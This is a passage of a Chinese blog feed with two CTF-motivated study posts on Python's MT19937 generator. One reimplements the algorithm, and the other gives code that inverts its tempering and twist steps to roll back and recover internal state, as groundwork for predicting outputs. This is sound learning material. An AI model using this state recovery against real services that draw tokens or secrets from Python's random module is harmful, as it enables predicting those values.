punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x94284000</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">21</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x14200000</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x10000000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>最后，逆向第一步：<code>y ^= (y &gt;&gt; 11)</code></p><p>类似于上一步，我们可以不断右移再异或，直到右侧的$y$变成0：</p><script type="math/tex; mode=display">\begin{aligned}y &= z\oplus (y\gg11)\\&=z\oplus((z\oplus(y\gg11))\gg11)\\&=z\oplus(z\gg11)\oplus(y\gg22)\\&=z\oplus(z\gg11)\oplus(z\oplus (y\gg11)\gg22)\\&=z\oplus(z\gg11)\oplus(z\gg22)\oplus(y\gg33)\end{aligned}</script><p>注意，$y$是32位整数，右移33位就归零了，因此，第一步的逆向如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">22</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>综合上述内容，我们可以写出<code>untempering</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">untempering</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xefc60000</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x9d2c5680</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">14</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x94284000</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">21</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x14200000</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">&lt;&lt;</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x10000000</span><span class="token punctuation">)</span>    y <span class="token operator">^</span><span class="token operator">=</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">22</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="逆向-twist"><a href="#逆向-twist" class="headerlink" title="逆向 twist"></a>逆向 twist</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">twist</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>    y <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>UPPER_MASK<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>N<span class="token punctuation">]</span> <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>LOWER_MASK<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> y <span class="token operator">>></span> <span class="token number">1</span>    <span class="token keyword">if</span> y <span class="token operator">&amp;</span> <span class="token number">0x1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> self<span class="token punctuation">.</span>MATRIX_A    self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span><span class="token operator">=</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> self<span class="token punctuation">.</span>M<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>N<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逆向<code>twist</code>其实相当于恢复<code>_mt[i]</code>。</p><p>我们首先写出最后一步的逆向：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">tmp <span class="token operator">=</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> self<span class="token punctuation">.</span>M<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>N<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里<code>tmp</code>的值应为上面<code>twist</code>函数中经过3、4、5三行之后的<code>_mt[i]</code>的值，那么如何判断在正向过程中是否进入了这个<code>if</code>分支？其实我们只要关注<code>tmp</code>的最高位（32位整数的意义下）即可。</p><p>如果未曾进入<code>if</code>分支，那么<code>tmp</code>的值为<code>y&gt;&gt;1</code>，是某个32位整数右移得来的，故此时<code>tmp</code>最高位必为0；反之，若进入了<code>if</code>分支，其还会异或一个<code>MATRIX_A</code>，而我们知道<code>MATRIX_A</code>的最高位为1，因此这时<code>tmp</code>最高位也一定会变成1。</p><p>再考虑到进入<code>if</code>语句的条件是<code>y</code>的最低位为1，因此我们根据<code>tmp</code>的最高位的值，其实已经可以推导出<code>twist</code>函数里的变量<code>y</code>的值了。</p><p>接下来的几行代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> tmp <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>UPPER_MASK <span class="token operator">==</span> self<span class="token punctuation">.</span>UPPER_MASK<span class="token punctuation">:</span>    tmp <span class="token operator">^</span><span class="token operator">=</span> self<span class="token punctuation">.</span>MATRIX_A    tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>    tmp <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">else</span><span class="token punctuation">:</span>    tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时<code>tmp</code>的值相当于<code>twist</code>函数里的变量<code>y</code>，我们看看它包含了哪些信息：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">y <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>UPPER_MASK<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>N<span class="token punctuation">]</span> <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>LOWER_MASK<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这说明<code>y</code>的最高位是<code>_mt[i]</code>的最高位，<code>y</code>的后31位则是<code>_mt[i+1]</code>的后31位。</p><p>因此我们已经恢复出<code>_mt[i]</code>的最高位了，接下来只要恢复其后31位即可。</p><p>显然，想要恢复<code>_mt[i]</code>的后31位，只需将前面所有操作的下标减去1，即可在<code>tmp</code>的后31位得到<code>_mt[i]</code>的后31位。这一步非常巧妙。</p><p>于是，<code>untwist</code>的完整代码就呼之欲出了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">untwist</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> self<span class="token punctuation">.</span>M<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>N<span class="token punctuation">]</span>    <span class="token keyword">if</span> tmp <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>UPPER_MASK <span class="token operator">==</span> self<span class="token punctuation">.</span>UPPER_MASK<span class="token punctuation">:</span>        tmp <span class="token operator">^</span><span class="token operator">=</span> self<span class="token punctuation">.</span>MATRIX_A        tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>        tmp <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>    res <span class="token operator">=</span> tmp <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>UPPER_MASK    <span class="token comment"># 进行与前面一模一样的操作，不过将下标减去了1</span>    tmp <span class="token operator">=</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> self<span class="token punctuation">.</span>M <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>N<span class="token punctuation">]</span>    <span class="token keyword">if</span> tmp <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>UPPER_MASK <span class="token operator">==</span> self<span class="token punctuation">.</span>UPPER_MASK<span class="token punctuation">:</span>        tmp <span class="token operator">^</span><span class="token operator">=</span> self<span class="token punctuation">.</span>MATRIX_A        tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>        tmp <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        tmp <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">1</span>    res <span class="token operator">|</span><span class="token operator">=</span> tmp <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>LOWER_MASK    self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="逆向-extract-number"><a href="#逆向-extract-number" class="headerlink" title="逆向 extract_number"></a>逆向 extract_number</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">extract_number</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>_mti <span class="token operator">>=</span> self<span class="token punctuation">.</span>N<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>twist<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_mti <span class="token operator">=</span> <span class="token number">0</span>    y <span class="token operator">=</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>self<span class="token punctuation">.</span>_mti<span class="token punctuation">]</span>    y <span class="token operator">=</span> self<span class="token punctuation">.</span>tempering<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>_mti <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> _int32<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这就很容易了，可以直接写出：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">unextract_number</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>_mti <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mti <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>N    <span class="token keyword">if</span> self<span class="token punctuation">.</span>_mti <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>untwist<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_mti <span class="token operator">=</span> self<span class="token punctuation">.</span>N<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用此函数即可将当前的随机数内部状态倒回去一次迭代。</p><hr><p>以上，我们已基本实现了对MT19937算法的逆向，以此为基础，我们便有了预测Python随机数的能力，具体内容见<a href="/blog/12317/">下一篇文章</a>。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;a href=&quot;/blog/12239/&quot;&gt;前一篇文章&lt;/a&gt;分析了Python中随机算法的实现细节，本文就来对其进行逆向。&lt;/p&gt;
&lt;p&gt;由前文所述，MT19937提取随机数可分为两部分：&lt;code&gt;twist&lt;/code&gt;</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="密码学" scheme="https://blog.fyz666.xyz/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="PRNG" scheme="https://blog.fyz666.xyz/tags/prng/"/>
    
    <category term="MT19937" scheme="https://blog.fyz666.xyz/tags/mt19937/"/>
    
  </entry>
  
  <entry>
    <title>Python随机数的背后：MT19937算法之——算法分析</title>
    <link href="https://blog.fyz666.xyz/blog/12239/"/>
    <id>https://blog.fyz666.xyz/blog/12239/</id>
    <published>2024-11-20T11:16:24.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>先前在做各种CTF时，总会遇到一些预测Python随机数的题，虽然知道伪随机数生成器都可以在一定条件下被预测，但由于不懂背后的原理，每每遇到此类题型就折戟于此。最近<del>痛定思痛</del>趁着兴趣练习了几道相关题型，在过程中把Python的伪随机数算法逆向了一下，觉得颇有收获，因此写几篇<del>网上相关内容早已烂大街的</del>博客记录一下。</p><p>笔者的代码公开于<a href="https://gist.github.com/windshadow233/229ec53e67577bedb8965e652fdc7466">此gist</a>。</p><p>本文主要分析一下Python使用的伪随机数算法：MT19937</p><h2 id="梅森旋转算法介绍"><a href="#梅森旋转算法介绍" class="headerlink" title="梅森旋转算法介绍"></a>梅森旋转算法介绍</h2><p>引用维基百科：</p><blockquote><p>The <strong>Mersenne Twister</strong> is a general-purpose <a href="https://en.wikipedia.org/wiki/Pseudorandom_number_generator">pseudorandom number generator</a> (PRNG) developed in 1997 by <a href="https://en.wikipedia.org/wiki/Makoto_Matsumoto_(mathematician">Makoto Matsumoto</a>) (松本 眞) and <a href="https://en.wikipedia.org/w/index.php?title=Takuji_Nishimura&amp;action=edit&amp;redlink=1">Takuji Nishimura</a> (西村 拓士). Its name derives from the choice of a <a href="https://en.wikipedia.org/wiki/Mersenne_prime">Mersenne prime</a> as its period length.</p><p>The Mersenne Twister was designed specifically to rectify most of the flaws found in older PRNGs.</p><p>The most commonly used version of the Mersenne Twister algorithm is based on the Mersenne prime $2^{19937}-1$​. The standard implementation of that, MT19937, uses a <a href="https://en.wikipedia.org/wiki/32-bit">32-bit</a> word length. There is another implementation (with five variants) that uses a 64-bit word length, MT19937-64; it generates a different sequence.<br><cite><a href="https://en.wikipedia.org/wiki/Mersenne_Twister">Wikipedia: Mersenne Twister</a></cite></p></blockquote><p>Python的伪随机数（<code>random</code>库）所使用的即是梅森旋转算法的一种常见变体：MT19937。其具有长达<script type="math/tex">2^{19937}-1</script>的周期，以及非常优良的性能：</p><blockquote><p>A pseudorandom sequence $x_i$ of <em>w</em>-bit integers of period $P$ is said to be k-distributed to <em>v</em>-bit accuracy if the following holds.</p><p>Let $trunc_v(x)$ denote the number formed by the leading v bits of $x$, and consider $P$ of the k v-bit vectors</p><script type="math/tex; mode=display">(trunc_v(x_i), trunc_v(x_{i+1}),\dots,trunc_v(x_{i+k-1}))\qquad(0\le i \lt P)</script><p>Then each of the $2^{kv}$ possible combinations of bits occurs the same number of times in a period, except for the all-zero combination that occurs once less often.<br><cite><a href="https://en.wikipedia.org/wiki/Mersenne_Twister#k-distribution">Mersenne Twister: k-distribution</a></cite></p></blockquote><p>根据以上k-distributed to v-bit accuracy（k-维 v-比特准确）的定义，如果一个伪随机数生成器$PRNG$可以产生周期为$P$的w-bit的序列$\left\lbrace x_{i}\right\rbrace$，我们将此序列中的元素的高$v$位截取出来，记为$trunc_v(x_i)$，然后构造下面的二进制数：</p><script type="math/tex; mode=display">PRNG_{k,v}(i)=(trunc_v(x_i), trunc_v(x_{i+1}),\dots,trunc_v(x_{i+k-1}))\qquad(0\le i \lt P)</script><p>此二进制数拥有$kv$比特，故其可以有$2^{kv}$种取值，若当$i$从$0\to P-1$遍历时，此二进制数可以在$[0,2^{kv}]$​上均匀分布，则这个$PRNG$是k-维 v-比特准确的。</p><p>MT19937则是一种623-维 32-比特准确的伪随机数发生器，而由于$\lfloor\frac{19937}{32}\rfloor=623$，故其k-维 v-比特准确度性能已达最大值。</p><h2 id="Python中梅森旋转算法的实现细节"><a href="#Python中梅森旋转算法的实现细节" class="headerlink" title="Python中梅森旋转算法的实现细节"></a>Python中梅森旋转算法的实现细节</h2><p>Python中<code>random</code>库的实现位于<a href="https://github.com/python/cpython/blob/main/Modules/_randommodule.c">CPython/Modules/_randommodule.c</a>，为便于理解，我将其中的重要内容重新用Python语言实现了一遍<del>（其实是因为我不太看得懂C语言，但我就不承认）</del></p><p>在这一版本的实现中，有以下一些重要参数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>N <span class="token operator">=</span> <span class="token number">624</span>self<span class="token punctuation">.</span>M <span class="token operator">=</span> <span class="token number">397</span>self<span class="token punctuation">.</span>MATRIX_A <span class="token operator">=</span> <span class="token number">0x9908b0df</span>self<span class="token punctuation">.</span>UPPER_MASK <span class="token operator">=</span> <span class="token number">0x80000000</span>self<span class="token punctuation">.</span>LOWER_MASK <span class="token operator">=</span> <span class="token number">0x7fffffff</span>self<span class="token punctuation">.</span>_mt <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> self<span class="token punctuation">.</span>Nself<span class="token punctuation">.</span>_mti <span class="token operator">=</span> <span class="token number">624</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>N</code>为状态向量长度，也是参与梅森旋转的随机数个数</li><li><code>M</code>为一个0到<code>N</code>之间的常数，在Python的实现中取为397</li><li><code>MATRIX_A</code>本意为一个描述梅森旋转过程的矩阵，而这里根据一些计算特性，直接将其定义为了一个32bit常数，其实际上代表了这样一个2进制向量：<code>10011001000010001011000011011111</code>，用于旋转过程中与随机数状态向量的按位异或操作。</li><li><code>UPPER_MASK</code>与<code>LOWER_MASK</code>，两个遮罩变量，分别用于取一个32bit向量的最高位与低31位。</li><li><code>_mt</code>为内部状态向量数组。</li><li><code>_mti</code>为下标计数器，初始化为624。</li></ul><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>当我们在Python中初始化一个梅森旋转随机数发生器时，其内部首先会根据种子来初始化状态向量数组：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">init_genrand</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> seed<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> _int32<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> _int32<span class="token punctuation">(</span><span class="token number">1812433253</span> <span class="token operator">*</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>_mti <span class="token operator">=</span> self<span class="token punctuation">.</span>N<span class="token keyword">def</span> <span class="token function">init_by_array</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> key<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>init_genrand<span class="token punctuation">(</span><span class="token number">19650218</span><span class="token punctuation">)</span>    i<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    k <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>N<span class="token punctuation">,</span> length<span class="token punctuation">)</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1664525</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> key<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> j        self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> _int32<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">1</span>        j <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> i <span class="token operator">>=</span> self<span class="token punctuation">.</span>N<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>self<span class="token punctuation">.</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>            i <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">if</span> j <span class="token operator">>=</span> length<span class="token punctuation">:</span>            j <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1566083941</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> i        self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> _int32<span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        i <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> i <span class="token operator">>=</span> self<span class="token punctuation">.</span>N<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>self<span class="token punctuation">.</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>            i <span class="token operator">=</span> <span class="token number">1</span>    self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x80000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们给定的<code>seed</code>会经过一系列变换得到<code>init_by_array</code>函数的<code>key</code>参数，然后通过此函数对内部状态数组进行初始化。不过这部分内容并无多大用，更重要的还是其提取随机数的过程，Python的<code>random</code>库产生的任何形式的伪随机数最终都会追溯到通过梅森旋转算法提取1次或多次伪随机数。</p><p>梅森旋转算法每次提取产生一个32bit的伪随机数。其产生随机数的过程可分为两次操作：<code>twist</code>与<code>tempering</code>。</p><h3 id="Twist"><a href="#Twist" class="headerlink" title="Twist"></a>Twist</h3><p>这个操作就是梅森旋转算法名字中的“旋转”了，其过程如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">twist</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span>    y <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> self<span class="token punctuation">.</span>UPPER_MASK<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>_mt<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token 